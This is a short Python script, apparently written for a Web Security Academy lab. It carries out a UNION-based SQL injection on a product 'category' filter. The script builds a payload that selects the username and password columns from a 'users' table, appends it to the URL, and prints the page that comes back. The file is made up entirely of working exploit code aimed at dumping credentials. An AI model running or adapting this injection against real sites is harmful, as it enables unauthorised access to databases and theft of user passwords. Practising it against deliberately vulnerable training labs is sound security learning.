from Lab2 import get_cols_no, determine_col
from pwn import *
import requests

def get_pass(url, index, cols):
    u, v = index[0], index[1]
    payload = 'none, ' * (u - 1) + 'username, ' \
                + 'none, ' * (v - u - 1)        \
                + 'password' + ', none' * (cols - v - 1)   \
                + ' from users --'
    new_url = url + '\' union select {}'.format(payload)
    response = requests.get(new_url)
    print(response.text)

if __name__ == '__main__':
    url = 'https://acd11f3e1fc6ef9d800e11ed00c10047.web-security-academy.net/filter?category=Lifestyle'
    # col_no = get_cols_no(url, 1, 10)
    # index = determine_col(url, col_no)
    index = [0, 1]
    get_pass(url, index, 2)